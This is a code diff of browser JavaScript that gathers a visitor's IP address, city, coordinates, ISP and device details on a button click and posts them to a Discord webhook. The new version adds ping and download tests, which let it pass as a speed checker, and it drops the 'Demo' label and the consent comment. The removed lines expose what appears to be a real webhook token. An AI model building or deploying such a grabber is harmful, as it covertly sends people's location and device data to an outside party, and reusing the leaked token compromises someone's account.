@@ -1,17 +1,15 @@
 // --- CONFIG ---
-// Replace with your own Discord webhook URL (keep it secret).
-const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1415394791654428856/0uncp10Lr772qmkanZ4aKAGYo63UdG9XnW32s0UA2CrXXx8ZiubzteQiBxxAgVrAvoTg";
+const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/XXXX/XXXX";
 
 // --- utility ---
 function safeStringify(obj) {
   try { return JSON.stringify(obj, null, 2); } catch (e) { return String(obj); }
 }
-
 const statusEl = () => document.getElementById('status');
 const outputEl = () => document.getElementById('output');
 const btn = document.getElementById('logBtn');
 
-// Collect local (client-side) info including device details
+// Collect client info + device details
 function collectClientInfo() {
   const client = {
     timestamp: new Date().toISOString(),
@@ -20,23 +18,21 @@ function collectClientInfo() {
     timezone: Intl.DateTimeFormat().resolvedOptions().timeZone || null,
     screen: (screen && screen.width && screen.height) ? `${screen.width}x${screen.height}` : null,
     platform: navigator.platform || null,
-    deviceMemory: navigator.deviceMemory || "unknown",      // Approx RAM in GB
-    cpuCores: navigator.hardwareConcurrency || "unknown",   // CPU threads
-    touchSupport: navigator.maxTouchPoints || 0             // Touchscreen support
+    deviceMemory: navigator.deviceMemory || "unknown",
+    cpuCores: navigator.hardwareConcurrency || "unknown",
+    touchSupport: navigator.maxTouchPoints || 0
   };
 
-  // Modern User-Agent Client Hints API (if supported)
   if (navigator.userAgentData) {
     client.userAgentData = {
       mobile: navigator.userAgentData.mobile,
       brands: navigator.userAgentData.brands
     };
   }
-
   return client;
 }
 
-// Fetch IP + geolocation via HTTPS API (ipapi.co)
+// Fetch IP + geolocation
 async function fetchGeo() {
   const url = 'https://ipapi.co/json/';
   const res = await fetch(url, { cache: 'no-store' });
@@ -44,27 +40,53 @@ async function fetchGeo() {
   return await res.json();
 }
 
-// Send results to Discord webhook
+// --- Network tests ---
+// Ping test: average of 3 small fetches
+async function testPing() {
+  const url = "https://www.cloudflare.com/favicon.ico"; // tiny file
+  const attempts = 3;
+  let times = [];
+  for (let i = 0; i < attempts; i++) {
+    const start = performance.now();
+    await fetch(url, { cache: "no-store" });
+    times.push(performance.now() - start);
+  }
+  const avg = times.reduce((a,b) => a+b,0) / times.length;
+  return Math.round(avg);
+}
+
+// Download test: fetch ~5MB file
+async function testDownload() {
+  const url = "https://speed.hetzner.de/5MB.bin"; // test file
+  const start = performance.now();
+  const res = await fetch(url, { cache: "no-store" });
+  const blob = await res.blob();
+  const end = performance.now();
+  const seconds = (end - start) / 1000;
+  const mbps = (blob.size * 8 / 1_000_000) / seconds;
+  return mbps.toFixed(2);
+}
+
+// Send results to Discord
 async function sendToDiscord(payload) {
   if (!DISCORD_WEBHOOK_URL || DISCORD_WEBHOOK_URL.includes('XXXX')) {
-    console.warn('Discord webhook URL not set. Skipping Discord send.');
+    console.warn('Webhook not set, skipping.');
     return { skipped: true };
   }
 
   const body = {
-    content: '```json\\n' + safeStringify(payload) + '\\n```',
+    content: '```json\n' + safeStringify(payload) + '\n```',
     embeds: [{
-      title: 'New Visitor Info (Demo)',
+      title: 'New Visitor Info',
       color: 3447003,
       fields: [
         { name: 'IP', value: payload.ip || 'n/a', inline: true },
         { name: 'Country', value: payload.country || 'n/a', inline: true },
         { name: 'City', value: payload.city || 'n/a', inline: true },
-        { name: 'Latitude', value: payload.latitude ? String(payload.latitude) : 'n/a', inline: true },
-        { name: 'Longitude', value: payload.longitude ? String(payload.longitude) : 'n/a', inline: true },
+        { name: 'Ping (ms)', value: String(payload.ping || 'n/a'), inline: true },
+        { name: 'Download (Mbps)', value: String(payload.downloadMbps || 'n/a'), inline: true },
         { name: 'Device RAM (GB)', value: String(payload.deviceMemory || 'n/a'), inline: true },
-        { name: 'CPU Cores', value: String(payload.cpuCores || 'n/a'), inline: true },
-        { name: 'Touch Support', value: String(payload.touchSupport || '0'), inline: true }
+        { name: 'CPU Cores', value: String(payload.cpuCores || 'n/a'), inline: true }
       ],
       timestamp: new Date().toISOString()
     }]
@@ -75,20 +97,26 @@ async function sendToDiscord(payload) {
     headers: { 'Content-Type': 'application/json' },
     body: JSON.stringify(body)
   });
-
-  if (!res.ok) throw new Error('Discord webhook returned ' + res.status);
+  if (!res.ok) throw new Error('Webhook returned ' + res.status);
   return { success: true };
 }
 
-// Main flow triggered by user consent button
-btn.addEventListener('click', async function() {
+// --- Main flow ---
+btn.addEventListener('click', async () => {
   btn.disabled = true;
   statusEl().textContent = 'Collecting...';
 
   try {
     const client = collectClientInfo();
-    statusEl().textContent = 'Fetching IP & geolocation...';
+
+    statusEl().textContent = 'Fetching IP & geo...';
     const geo = await fetchGeo();
+
+    statusEl().textContent = 'Testing ping...';
+    const ping = await testPing();
+
+    statusEl().textContent = 'Testing download speed...';
+    const downloadMbps = await testDownload();
 
     const full = Object.assign({}, client, {
       ip: geo.ip || null,
@@ -98,17 +126,19 @@ btn.addEventListener('click', async function() {
       latitude: geo.latitude || null,
       longitude: geo.longitude || null,
       isp: geo.org || null,
+      ping,
+      downloadMbps,
       geo_raw: geo
     });
 
     outputEl().textContent = safeStringify(full);
-    statusEl().textContent = 'Sending to Discord (if webhook set)...';
+    statusEl().textContent = 'Sending to Discord...';
 
     const sendRes = await sendToDiscord(full);
-    if (sendRes && sendRes.skipped) {
-      statusEl().textContent = 'Ready — webhook not configured; skipped.';
+    if (sendRes.skipped) {
+      statusEl().textContent = 'Done — webhook not set.';
     } else {
-      statusEl().textContent = 'Sent to Discord.';
+      statusEl().textContent = 'Done — sent to Discord.';
     }
   } catch (err) {
     console.error(err);
